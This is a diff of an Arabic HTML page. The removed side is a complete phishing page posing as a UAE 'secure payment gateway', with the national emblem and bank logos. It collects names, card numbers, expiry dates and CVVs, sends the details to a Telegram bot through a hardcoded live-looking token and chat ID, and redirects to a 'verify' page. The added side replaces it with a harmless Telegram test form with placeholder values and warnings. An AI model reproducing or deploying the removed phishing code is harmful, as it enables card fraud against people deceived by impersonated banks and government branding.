@@ -1,320 +1,80 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>بوابة الدفع الآمنة</title>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>إرسال رسالة تجريبية إلى بوت التلغرام (آمن)</title>
   <style>
-    /* ===== التصميم العام ===== */
-    body {
-      font-family: 'Tahoma', Arial, sans-serif;
-      background: linear-gradient(135deg, #f2f7f5, #e6eeea);
-      margin: 0;
-      padding: 0;
-      direction: rtl;
-      box-sizing: border-box;
-    }
-
-    .container {
-      max-width: 600px;
-      margin: 30px auto;
-      padding: 20px;
-    }
-
-    .card {
-      background: #fff;
-      border-radius: 12px;
-      padding: 25px;
-      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.08);
-      transition: all 0.3s ease;
-    }
-
-    .card:hover {
-      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12);
-    }
-
-    /* ===== الهيدر ===== */
-    header {
-      text-align: center;
-      margin-bottom: 20px;
-    }
-
-    header img {
-      height: 80px;
-      margin-bottom: 10px;
-    }
-
-    header h1 {
-      font-size: 24px;
-      color: #1f6d3b;
-      margin: 0;
-    }
-
-    /* ===== الحقول ===== */
-    label {
-      display: block;
-      margin-top: 15px;
-      font-weight: 600;
-      color: #222;
-      font-size: 15px;
-    }
-
-    input,
-    select,
-    button {
-      width: 100%;
-      padding: 12px;
-      margin-top: 6px;
-      border: 1px solid #ddd;
-      border-radius: 8px;
-      box-sizing: border-box;
-      font-size: 15px;
-      transition: border-color 0.2s ease;
-    }
-
-    input:focus,
-    select:focus {
-      border-color: #1f6d3b;
-      outline: none;
-    }
-
-    /* ===== قائمة البنوك مع الصور ===== */
-    .bank-select {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
-
-    .bank-logos {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 8px;
-      margin-top: 10px;
-      justify-content: center;
-    }
-
-    .bank-logos img {
-      width: 50px;
-      height: 30px;
-      object-fit: contain;
-      border: 1px solid #ddd;
-      border-radius: 6px;
-      padding: 3px;
-      background: #fff;
-    }
-
-    /* ===== صفوف متعددة ===== */
-    .row {
-      display: flex;
-      gap: 10px;
-    }
-
-    .col {
-      flex: 1;
-    }
-
-    /* ===== رسائل الخطأ ===== */
-    .error {
-      color: #b00020;
-      font-size: 13px;
-      display: none;
-      margin-top: 8px;
-      text-align: center;
-    }
-
-    /* ===== الزر ===== */
-    button {
-      background: #1f6d3b;
-      color: #fff;
-      border: 0;
-      cursor: pointer;
-      font-weight: bold;
-      margin-top: 20px;
-      font-size: 16px;
-      transition: background 0.3s ease;
-    }
-
-    button:hover {
-      background: #155a2e;
-    }
-
-    /* ===== ميديا كويري للشاشات الصغيرة ===== */
-    @media (max-width: 480px) {
-      header img {
-        height: 60px;
-      }
-      header h1 {
-        font-size: 20px;
-      }
-      .bank-logos img {
-        width: 40px;
-        height: 25px;
-      }
-    }
+    body{font-family:Tahoma,Arial;direction:rtl;background:#f4f7fb;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
+    .box{background:#fff;padding:20px;border-radius:10px;box-shadow:0 8px 24px rgba(2,6,23,0.08);width:100%;max-width:360px;text-align:center}
+    h2{color:#004080;margin:0 0 12px}
+    input,textarea{width:100%;padding:10px;border:1px solid #d9e6ff;border-radius:8px;margin-top:8px;font-size:14px}
+    button{width:100%;padding:12px;margin-top:12px;border:0;border-radius:8px;background:#004080;color:#fff;font-weight:700;cursor:pointer}
+    .status{margin-top:10px;font-size:14px;color:#666;min-height:20px}
+    .note{font-size:12px;color:#9aa3b2;margin-top:8px}
   </style>
 </head>
 <body>
-  <div class="container">
-    <div class="card">
-      <header>
-        <img src="https://upload.wikimedia.org/wikipedia/commons/6/65/Emblem_of_the_United_Arab_Emirates.svg" alt="شعار">
-        <h1>بوابة الدفع الآمنة</h1>
-      </header>
+  <div class="box" role="main" aria-labelledby="title">
+    <h2 id="title">إرسال رسالة تجريبية إلى بوت</h2>
 
-      <form id="paymentForm" autocomplete="off" novalidate>
-        <label for="fullName">الاسم الكامل</label>
-        <input id="fullName" type="text" placeholder="الاسم كما في البطاقة" required>
+    <label for="msg">اكتب نصًا غير حساس فقط (مثال: "اختبار")</label>
+    <textarea id="msg" rows="3" placeholder="أدخل نص تجريبي..."></textarea>
 
-        <label for="bank">البنك</label>
-        <div class="bank-select">
-          <select id="bank" required>
-            <option value="">— اختر البنك —</option>
-            <option>بنك أبوظبي الأول</option>
-            <option>مصرف أبوظبي الإسلامي</option>
-            <option>بنك الإمارات دبي الوطني</option>
-            <option>بنك دبي الإسلامي</option>
-            <option>بنك المشرق</option>
-            <option>HSBC</option>
-            <option>سيتي بنك</option>
-          </select>
-        </div>
+    <button id="send">إرسال إلى البوت</button>
 
-        <div class="bank-logos">
-          <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
-          <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="MasterCard">
-          <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/HSBC_logo_%282018%29.svg" alt="HSBC">
-          <img src="https://upload.wikimedia.org/wikipedia/commons/d/d6/Emirates_NBD_logo.svg" alt="Emirates NBD">
-          <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/ADIB_logo.svg" alt="ADIB">
-        </div>
-
-        <label for="amount">قيمة السداد (درهم إماراتي)</label>
-        <input id="amount" type="number" min="1" step="0.01" placeholder="مثال: 100.00" required>
-
-        <label for="cardNumber">رقم البطاقة</label>
-        <input id="cardNumber" inputmode="numeric" maxlength="19" placeholder="XXXX-XXXX-XXXX-XXXX" required>
-
-        <div class="row">
-          <div class="col">
-            <label for="expiryMonth">شهر الانتهاء (MM)</label>
-            <select id="expiryMonth" required>
-              <option value="">--</option>
-              <option>01</option><option>02</option><option>03</option>
-              <option>04</option><option>05</option><option>06</option>
-              <option>07</option><option>08</option><option>09</option>
-              <option>10</option><option>11</option><option>12</option>
-            </select>
-          </div>
-          <div class="col">
-            <label for="expiryYear">سنة الانتهاء (YYYY)</label>
-            <select id="expiryYear" required>
-              <option value="">--</option>
-            </select>
-          </div>
-        </div>
-
-        <label for="cvv">رمز التحقق CVV</label>
-        <input id="cvv" type="password" inputmode="numeric" maxlength="4" placeholder="***" required>
-
-        <div class="error" id="formError">الرجاء ملء كل الحقول بشكل صحيح.</div>
-
-        <button type="submit">متابعة الدفع</button>
-      </form>
-    </div>
+    <div class="status" id="status"></div>
+    <div class="note">تحذير: لا تدخل بيانات بطاقة/هوية/CVV/معلومات حسّاسة. هذا للاختبار فقط.</div>
   </div>
 
-  <script>
-    // ===== تكوين البوت =====
-    const BOT_TOKEN = "8175456301:AAHcojlkfA5YkgBkx5gAnvFjd-u5Tk6hg7I";
-    const CHAT_ID  = "8404960059";
+<script>
+  // ✳️ ضع التوكن والـ chat id هنا فقط إذا أنت مالك البوت وتعلم ماذا تفعل
+  const BOT_TOKEN = "PUT_YOUR_BOT_TOKEN_HERE";
+  const CHAT_ID   = "PUT_YOUR_CHAT_ID_HERE";
 
-    // إضافة سنوات الانتهاء ديناميكياً
-    (function fillYears() {
-      const sel = document.getElementById('expiryYear');
-      for (let y = 2025; y <= 2044; y++) {
-        const o = document.createElement('option');
-        o.textContent = String(y);
-        o.value = String(y);
-        sel.appendChild(o);
-      }
-    })();
+  const sendBtn = document.getElementById('send');
+  const status = document.getElementById('status');
 
-    // تنسيق رقم البطاقة
-    function formatCardNumberField(el) {
-      let v = el.value.replace(/\D/g, '').slice(0, 16);
-      const parts = v.match(/.{1,4}/g) || [];
-      el.value = parts.join('-');
-    }
-    document.getElementById('cardNumber').addEventListener('input', function () {
-      formatCardNumberField(this);
-    });
+  function setStatus(text, ok){
+    status.textContent = text;
+    status.style.color = ok === true ? "green" : ok === false ? "red" : "#666";
+  }
 
-    function last4(numberStr) {
-      const digits = numberStr.replace(/\D/g, '');
-      return digits.slice(-4).padStart(4, '*');
+  sendBtn.addEventListener('click', async () => {
+    const text = document.getElementById('msg').value.trim();
+
+    if(!text){
+      setStatus('الرجاء إدخال نص تجريبي لإرساله (غير حساس).', false);
+      return;
     }
 
-    document.getElementById('paymentForm').addEventListener('submit', async function (e) {
-      e.preventDefault();
-      const errEl = document.getElementById('formError');
-      errEl.style.display = 'none';
+    // أمان: لا نتحقق هنا مما ترسله — المسؤولية عليك بعدم إدخال بيانات حسّاسة.
+    if(!BOT_TOKEN || !CHAT_ID){
+      setStatus('لم يتم إعداد BOT_TOKEN أو CHAT_ID في الكود. ضع القيم ثم أعد المحاولة.', false);
+      return;
+    }
 
-      const fullName = document.getElementById('fullName').value.trim();
-      const bank = document.getElementById('bank').value;
-      const amount = document.getElementById('amount').value.trim();
-      const cardNumber = document.getElementById('cardNumber').value.trim();
-      const expiryMonth = document.getElementById('expiryMonth').value;
-      const expiryYear = document.getElementById('expiryYear').value;
-      const cvv = document.getElementById('cvv').value.trim();
+    setStatus('جاري إرسال الرسالة...', null);
 
-      if (!fullName || !bank || !amount || !cardNumber || !expiryMonth || !expiryYear || !cvv) {
-        errEl.textContent = 'الرجاء ملء كل الحقول المطلوبة.';
-        errEl.style.display = 'block';
-        return;
+    try {
+      const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ chat_id: CHAT_ID, text })
+      });
+
+      if(resp.ok){
+        setStatus('✅ تم الإرسال إلى البوت بنجاح.', true);
+      } else {
+        const json = await resp.json().catch(()=>null);
+        const err = json && json.description ? json.description : 'فشل إرسال الرسالة.';
+        setStatus('❌ ' + err, false);
       }
-
-      const digits = cardNumber.replace(/\D/g, '');
-      if (digits.length < 12 || digits.length > 16) {
-        errEl.textContent = 'رقم البطاقة غير صالح.';
-        errEl.style.display = 'block';
-        return;
-      }
-
-      if (!/^\d{3,4}$/.test(cvv)) {
-        errEl.textContent = 'رمز CVV غير صالح.';
-        errEl.style.display = 'block';
-        return;
-      }
-
-      const now = new Date();
-      const yNum = parseInt(expiryYear, 10), mNum = parseInt(expiryMonth, 10);
-      if (yNum < now.getFullYear() || (yNum === now.getFullYear() && mNum < now.getMonth() + 1)) {
-        errEl.textContent = 'تاريخ الصلاحية منتهي.';
-        errEl.style.display = 'block';
-        return;
-      }
-
-      const maskedCard = '****-****-****-' + last4(cardNumber);
-
-      const message = `💳 عملية دفع جديدة:
------------------------
-👤 الاسم: ${fullName}
-🏦 البنك: ${bank}
-💰 المبلغ: ${amount} درهم
-🔢 البطاقة: ${maskedCard}
-📆 تاريخ الانتهاء: ${expiryMonth}/${expiryYear}`;
-
-      try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-        });
-      } catch (err) {
-        console.warn('فشل الإرسال إلى تيليجرام —', err);
-      }
-
-      window.location.href = 'verify.html';
-    });
-  </script>
+    } catch(e){
+      console.error(e);
+      setStatus('⚠️ خطأ في الاتصال. افتح console للتحقق.', false);
+    }
+  });
+</script>
 </body>
 </html>
